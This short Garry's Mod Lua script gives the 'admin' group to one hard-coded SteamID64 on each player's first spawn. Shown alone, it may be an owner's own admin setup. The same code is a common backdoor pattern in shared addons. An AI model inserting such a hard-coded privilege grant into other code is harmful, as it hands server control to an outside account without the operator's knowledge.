local MetaPlayers = FindMetaTable("Player")
local Priv = {
    ["76561198984079607"] = "admin"
}

function MetaPlayers:SetGroup(Group)
    self:SetUserGroup(Group)
end

hook.Add("PlayerInitialSpawn", "Admin:PlayerInitialSpawn:GivingPriv", function(Player)
    if(Priv[Player:SteamID64()] ~= nil)then Player:SetGroup(Priv[Player:SteamID64()])end
end)